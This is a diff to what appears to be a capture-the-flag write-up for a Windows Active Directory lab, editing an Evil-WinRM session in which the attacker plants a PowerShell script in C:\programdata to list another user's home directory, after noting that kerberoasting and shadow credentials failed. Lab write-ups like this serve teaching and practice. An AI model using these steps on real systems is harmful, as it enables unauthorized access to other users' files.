@@ -435,27 +435,9 @@ A targeted kerberoast attack does not work and shadow credentials dont either
 # Accessing `maria` home directory
 
 ```python
-*Evil-WinRM* PS C:\Users\smith\Documents> echo "dir \users\maria\ > \programdata\content" > maria.ps1
-*Evil-WinRM* PS C:\Users\smith\Documents> mv maria.ps1 C:\programdata
-*Evil-WinRM* PS C:\Users\smith\Documents> dir C:\programdata
-
-
-    Directory: C:\programdata
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d---s-       10/21/2021   3:13 AM                Microsoft
-d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
-d-----        9/15/2018  12:19 AM                SoftwareDistribution
-d-----        4/10/2020   5:48 AM                ssh
-d-----        4/10/2020  10:49 AM                USOPrivate
-d-----        4/10/2020  10:49 AM                USOShared
-d-----        8/25/2021   2:57 AM                VMware
--a----        4/21/2026   8:47 AM             86 maria.ps1
-
-
-*Evil-WinRM* PS C:\Users\smith\Documents> 
+*Evil-WinRM* PS C:\programdata> echo 'dir C:\Users\maria\ > C:\programdata\content' > maria.ps1
+*Evil-WinRM* PS C:\programdata> type maria.ps1
+dir C:\Users\maria\ > C:\programdata\content
 ```
 
 ```python
